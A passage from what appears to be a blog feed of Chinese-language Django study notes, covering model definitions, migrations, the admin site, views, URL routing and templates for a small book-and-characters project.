punctuation">.</span>peopleinfo_set<span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取书籍中的所有人物</span>   context <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token string">'people_list'</span><span class="token punctuation">:</span> people_list   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'peoplelist.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、在<code>BookManager\urls.py</code>中新添url规则</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">re_path<span class="token punctuation">(</span><span class="token string">r'^booklist/(\d+)/$'</span><span class="token punctuation">,</span> views<span class="token punctuation">.</span>peoplelist<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">#(\d+)里的内容将直接传入peoplelist函数中的book_id参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有导入re_path需要导入一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> re_path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、新建<code>templates\eoplelist.html</code>文件</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>人物信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    &#123;% for people in people_list %&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>&#123;&#123; people.name &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    &#123;% endfor%&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、最后实现功能：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/12django_note.png.gif?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>6、总结MVT流程</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/13django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><ul><li>本次Django学习笔记更新完毕，本次项目源码已上传至我的github，源码链接：<a href="https://github.com/teamssix/Django_study_notes">https://github.com/teamssix/Django_study_notes</a></li></ul><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考链接：<a href="https://youtu.be/BXyGr9JQVcc">https://youtu.be/BXyGr9JQVcc</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django 学习笔记】4、模板</title>
      <link href="//200301-182831.html"/>
      <url>//200301-182831.html</url>
      
        <content type="html"><![CDATA[<p>1、在项目根目录下，创建<code>templates</code>目录，在<code>templates</code>下新建<code>index.html</code>文件，PyCharm将自动生成html的文件内容格式。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">.</span>├── Book├── BookManager└── templates    └── index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><a id="more"></a><p>2、编辑<code>setting.py</code>文件第58行，修改<code>TEMPLATES</code>内容如下，目的是添加<code>templates</code>路径，好让接下来程序能够找到<code>index.html</code>文件。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">'DIRS'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'templates'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、修改<code>view.py</code>文件如下。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>shortcuts <span class="token keyword">import</span> render<span class="token keyword">from</span> django<span class="token punctuation">.</span>http <span class="token keyword">import</span> HttpResponse<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'H1'</span><span class="token punctuation">:</span><span class="token string">'OK!'</span><span class="token punctuation">,</span><span class="token string">'H2'</span><span class="token punctuation">:</span><span class="token string">'-- By TeamsSix'</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、修改<code>index.html</code>文件如下。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>H1</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>&#123;&#123; H1 &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>H1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>H2</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span>limegreen<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>&#123;&#123; H2 &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>H2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、此时，刷新浏览器。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/10django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>6、视图与<code>templates</code>的总结</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/11django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考链接：</p><p><a href="https://youtu.be/BXyGr9JQVcc">https://youtu.be/BXyGr9JQVcc</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django 学习笔记】3、视图</title>
      <link href="//200301-182816.html"/>
      <url>//200301-182816.html</url>
      
        <content type="html"><![CDATA[<ul><li>后台管理页面搞定之后，就需要做公共页面的访问了</li><li>对于Django的设计框架MVT：<ul><li>用户在URL中请求的是视图</li><li>视图接受请求后进行处理</li><li>然后将处理的结果返回给请求者</li></ul></li><li>使用视图时要进行的两步操作：<ul><li>定义视图</li><li>配置URL</li></ul></li></ul><a id="more"></a><h1 id="0x00-定义视图"><a href="#0x00-定义视图" class="headerlink" title="0x00 定义视图"></a>0x00 定义视图</h1><ul><li>视图就是一个Python函数，被定义在应用的views.py中。</li><li>视图的第一个参数是 <code>HttpRequest</code>类型的对象<code>request</code>，包含了所有请求信息</li><li>视图必须返回<code>HttpResponse</code>对象，包含返回给请求者的响应信息。</li><li>需要导入<code>HttpResponse</code>模块：<code>from django.http import HttpResponse</code></li><li>定义视图函数：响应字符串<code>OK!</code>给客户端</li></ul><p>首先修改<code>views.py</code>文件，添加响应内容，修改后如下。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># BookManager/Book/views.py</span><span class="token keyword">from</span> django<span class="token punctuation">.</span>http <span class="token keyword">import</span> HttpResponse<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span><span class="token string">'OK!    -- By TeamsSix'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x01、配置URL"><a href="#0x01、配置URL" class="headerlink" title="0x01、配置URL"></a>0x01、配置URL</h1><p>之后再修改<code>urls.py</code>文件，添加<code>path(&#39;&#39;, views.index),</code>，完整的代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># BookManager/BookManager/urls.py</span><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin<span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> path<span class="token keyword">from</span> Book <span class="token keyword">import</span> viewsurlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>path<span class="token punctuation">(</span><span class="token string">'admin/'</span><span class="token punctuation">,</span> admin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>urls<span class="token punctuation">)</span><span class="token punctuation">,</span>path<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> views<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，当我们访问<code>127.0.0.1:8000</code>的时候，代码运行顺序是这样的：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">  HttpRequest↓ ↓ ↓ROOT_URLCONF <span class="token operator">=</span> <span class="token string">'BookManager.urls'</span><span class="token comment"># /BookManager/settings.py</span>↓ ↓ ↓path<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> views<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment"># /BookManager/urls.py</span>↓ ↓ ↓<span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span><span class="token string">'OK!    -- By TeamsSix'</span><span class="token punctuation">)</span><span class="token comment"># /Book/views.py</span>↓ ↓ ↓      HttpResponse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终，浏览器将顺利返回我们的<code>HttpResponse</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/9django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考链接：</p><p><a href="https://youtu.be/BXyGr9JQVcc">https://youtu.be/BXyGr9JQVcc</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django 学习笔记】2、模型</title>
      <link href="//200229-223431.html"/>
      <url>//200229-223431.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-模型"><a href="#0x00-模型" class="headerlink" title="0x00 模型"></a>0x00 模型</h1><ul><li><p>当前项目的开发, 都是数据驱动的。</p></li><li><p>使用Django进行数据库开发的提示 ：</p><ul><li><code>MVT</code>设计模式中的<code>Model</code>, 专门负责和数据库交互.对应<code>(models.py)</code></li><li>由于<code>Model</code>中内嵌了<code>ORM框架</code>, 所以不需要直接面向数据库编程.</li><li>而是定义模型类, 通过<code>模型类和对象</code>完成数据库表的<code>增删改查</code>.</li><li><code>ORM框架</code>就是把数据库表的行与相应的对象建立关联, 互相转换.使得数据库的操作面向对象.</li></ul></li><li><p>使用Django进行数据库开发的步骤 ：</p><ol><li>定义模型类</li><li>模型迁移</li><li>操作数据库</li></ol></li></ul><a id="more"></a><h2 id="1、定义模型类"><a href="#1、定义模型类" class="headerlink" title="1、定义模型类"></a>1、定义模型类</h2><p>在这之前需要先设计数据库的表什么的，这里就不详细的说了（主要是我太懒了，手动狗头），感兴趣的可以看本文的参考链接，下面直接贴定义模型类的代码.</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># BookManager&#x2F;Book&#x2F;models.pyfrom django.db import modelsclass BookInfo(models.Model):  # 定义数据信息类模型name &#x3D; models.CharField(max_length&#x3D;10)  # 设计name属性class PeopleInfo(models.Model):  # 定义人物信息类模型name &#x3D; models.CharField(max_length&#x3D;10)gender &#x3D; models.BooleanField()book &#x3D; models.ForeignKey(BookInfo)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、模型迁移"><a href="#2、模型迁移" class="headerlink" title="2、模型迁移"></a>2、模型迁移</h2><p>由两步完成，首先生成迁移文件，根据模型类生成创建表的语句；接下来执行迁移，根据第一步生成的语句在数据库中创建表。分别由以下两句完成。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 manage.py makemigrationspython3 manage.py migrate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">BookManager/ <span class="token operator">></span> python3 manage.py makemigrationsTraceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:  File <span class="token string">"manage.py"</span>, line <span class="token number">21</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>………内容太多，此处省略………TypeError: __init__<span class="token punctuation">(</span><span class="token punctuation">)</span> missing <span class="token number">1</span> required positional argument: <span class="token string">'on_delete'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在运行第一个命令的时候报错了，此时只需要修改定义外键的那行代码即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 原来的</span>book <span class="token operator">=</span> models<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span>BookInfo<span class="token punctuation">)</span><span class="token comment">#修改后</span>book <span class="token operator">=</span> models<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span>BookInfo<span class="token punctuation">,</span>on_delete<span class="token operator">=</span>models<span class="token punctuation">.</span>CASCADE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>发生这个错误的原因是由于我看的教程使用的是1.8版本的Django，而我安装的是3.0，Django在2.0版本后，如果定义外键就需要加上<code>on_delete</code>选项了，OK，接下来，继续运行这两个代码。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">BookManager/ <span class="token operator">></span> python3 manage.py makemigrationsMigrations <span class="token keyword">for</span> <span class="token string">'Book'</span><span class="token builtin class-name">:</span>  Book<span class="token punctuation">\</span>migrations<span class="token punctuation">\</span>0001_initial.py    - Create model BookInfo    - Create model PeopleInfoBookManager/ <span class="token operator">></span> python3 manage.py migrateOperations to perform:  Apply all migrations: Book, admin, auth, contenttypes, sessionsRunning migrations:  Applying Book.0001_initial<span class="token punctuation">..</span>. OK………内容太多，此处省略………  Applying sessions.0001_initial<span class="token punctuation">..</span>. OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到此，将主目录下生成的<code>db.sqlite3</code>文件拖拽到Database窗口中即可，如果没有Database的窗口，可以用Pycharm专业版试试。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/4django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x01-站点管理"><a href="#0x01-站点管理" class="headerlink" title="0x01 站点管理"></a>0x01 站点管理</h1><ul><li>站点分为内容发布和公共访问两部分。</li><li>使用django站点管理模块步骤：<ul><li>管理界面本地化</li><li>创建管理员</li><li>注册模型类</li><li>自定义站点管理界面</li></ul></li></ul><h2 id="1、管理界面本地化"><a href="#1、管理界面本地化" class="headerlink" title="1、管理界面本地化"></a>1、管理界面本地化</h2><p> 将语言，时间设置为本地的语言时间，大陆使用的<code>简体中文</code>，时区使用<code>亚洲/上海</code>时区，修改<code>settings.py</code>文件。</p><blockquote><p>ps：为什么是上海时区，而不是北京时区？可能老外感觉上海才是国际大都市，北京只是二三线城市，毕竟老外对中国的印象都是陆家嘴而不是天安门（道听途说，不要当真，嘿嘿）</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># BookManager/BookManager/settings.py</span>LANGUAGE_CODE <span class="token operator">=</span> <span class="token string">'zh-Hans'</span>TIME_ZONE <span class="token operator">=</span> <span class="token string">'Asia/Shanghai'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、创建管理员"><a href="#2、创建管理员" class="headerlink" title="2、创建管理员"></a>2、创建管理员</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 manage.py createsuperuser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 运行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">BookManager/ <span class="token operator">></span> python3 manage.py createsuperuser用户名 <span class="token punctuation">(</span>leave blank to use <span class="token string">'dora'</span><span class="token punctuation">)</span>: <span class="token builtin class-name">test</span>电子邮件地址: test@test.comPassword:Password <span class="token punctuation">(</span>again<span class="token punctuation">)</span>:Superuser created successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行服务</p><pre class="line-numbers language-none"><code class="language-none">BookManager&#x2F; &gt; python3 manage.py runserverWatching for file changes with StatReloaderPerforming system checks...System check identified no issues (0 silenced).February 29, 2020 - 20:52:43Django version 3.0.3, using settings &#39;BookManager.settings&#39;Starting development server at http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;Quit the server with CTRL-BREAK.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行之后，在浏览器打开 <a href="http://127.0.0.1:8000/admin%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%88%9A%E6%89%8D%E5%88%9B%E5%BB%BA%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86%E3%80%82">http://127.0.0.1:8000/admin，使用刚才创建的用户名密码登陆。</a></p><h2 id="3、注册模型类"><a href="#3、注册模型类" class="headerlink" title="3、注册模型类"></a>3、注册模型类</h2><p>刚打开管理员界面的时候，只能看到<code>认证和授权</code>管理栏，这时候就需要将模型类注册进去。</p><p>修改<code>admin.py</code>代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># BookManager/Book/admin.py</span><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin<span class="token keyword">from</span> Book<span class="token punctuation">.</span>models <span class="token keyword">import</span> BookInfo<span class="token punctuation">,</span>PeopleInfoadmin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>register<span class="token punctuation">(</span>BookInfo<span class="token punctuation">)</span>admin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>register<span class="token punctuation">(</span>PeopleInfo<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>刷新浏览器页面，即可看到刚添加的两个模型类。如果页面无法加载，可以看看是不是服务出现异常，如果出现异常，重新启动服务即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/5django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="4、自定义站点管理界面"><a href="#4、自定义站点管理界面" class="headerlink" title="4、自定义站点管理界面"></a>4、自定义站点管理界面</h2><p>在管理页面中，随便添加点数据，之后会发现书籍的名称都显示成了<code>BookInfo object</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/6django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时，只需要在<code>model.py</code>里的class里添加以下内容即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> self<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>model.py</code>完整的代码就是这个样子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># BookManager/Book/models.py</span><span class="token keyword">from</span> django<span class="token punctuation">.</span>db <span class="token keyword">import</span> models<span class="token keyword">class</span> <span class="token class-name">BookInfo</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 定义数据信息类模型</span>name <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># 设计name属性</span><span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> self<span class="token punctuation">.</span>name<span class="token keyword">class</span> <span class="token class-name">PeopleInfo</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 定义人物信息类模型</span>name <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>gender <span class="token operator">=</span> models<span class="token punctuation">.</span>BooleanField<span class="token punctuation">(</span><span class="token punctuation">)</span>book <span class="token operator">=</span> models<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span>BookInfo<span class="token punctuation">,</span>on_delete<span class="token operator">=</span>models<span class="token punctuation">.</span>CASCADE<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> self<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，再刷新页面，就可以看到显示正常了，同样 people info 界面也是正常的了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/7_1django_note.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>但是，这样显示还是不够直观，所以就需要自定义站点管理界面了，接下来修改<code>admin.py</code>页面，添加以下语句：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">PeopleInfoAdmin</span><span class="token punctuation">(</span>admin<span class="token punctuation">.</span>ModelAdmin<span class="token punctuation">)</span><span class="token punctuation">:</span>list_display <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'gender'</span><span class="token punctuation">,</span> <span class="token string">'book'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>admin.py</code>完成的代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># BookManager/Book/admin.py</span><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin<span class="token keyword">from</span> Book<span class="token punctuation">.</span>models <span class="token keyword">import</span> BookInfo<span class="token punctuation">,</span> PeopleInfo<span class="token keyword">class</span> <span class="token class-name">PeopleInfoAdmin</span><span class="token punctuation">(</span>admin<span class="token punctuation">.</span>ModelAdmin<span class="token punctuation">)</span><span class="token punctuation">:</span>list_display <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'gender'</span><span class="token punctuation">,</span> <span class="token string">'book'</span><span class="token punctuation">]</span>admin<span class="token 